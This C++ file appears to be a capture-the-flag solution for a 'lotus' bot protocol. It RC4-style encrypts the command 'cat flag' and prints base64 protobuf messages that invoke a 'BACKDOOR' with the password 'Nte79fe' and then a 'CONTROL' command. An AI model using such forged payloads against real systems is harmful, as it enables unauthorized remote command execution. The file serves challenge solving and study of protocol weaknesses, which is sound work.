#include <bits/stdc++.h>
#include "lotus.pb.h"

void init_magic_table(const char *data, size_t size, unsigned char *magic_table) {
	int x = 0;

	for (int i = 0; i < 256; ++i) {
		magic_table[i] = ~(unsigned char)i;
	}

	for (int j = 0; j < 256; ++j) {
		x = (unsigned char)(magic_table[j] + x + data[j % size]);
		std::swap(magic_table[j], magic_table[x]);
	}
}

void encode_cmd(unsigned char *magic_table, const char *data, size_t size, char *out) {
	int x = 0, y = 0;

	for (size_t i = 0; i < size; ++i) {
		x = (unsigned char)(x + 1);
		y = (unsigned char)(y + magic_table[x]);
		std::swap(magic_table[x], magic_table[y]);
		out[i] = magic_table[(unsigned char)(magic_table[x] + magic_table[y])] ^ data[i];
	}
}

static std::string base64_encode(const std::string &in) {
    std::string out;

    int val=0, valb=-6;
    for (unsigned char c : in) {
        val = (val<<8) + c;
        valb += 8;
        while (valb>=0) {
            out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val>>valb)&0x3F]);
            valb-=6;
        }
    }
    if (valb>-6) out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val<<8)>>(valb+8))&0x3F]);
    while (out.size()%4) out.push_back('=');
    return out;
}

char key[2] = ".", cmd_encoded[9];
unsigned char magic[256];

int main() {
	init_magic_table(key, 1, magic);
	encode_cmd(magic, "cat flag", 8, cmd_encoded);
	BotMessage bm;
	bm.set_cmd("BACKDOOR");
	bm.set_arg1("");
	bm.set_arg2("Nte79fe");
	std::string out;
	bm.SerializeToString(&out);
	std::cout << base64_encode(out) << '\n';
	bm.set_cmd("CONTROL");
	bm.set_arg1(std::string(key, 1));
	bm.set_arg2(std::string(cmd_encoded, 8));
	bm.SerializeToString(&out);
	std::cout << base64_encode(out) << '\n';
}
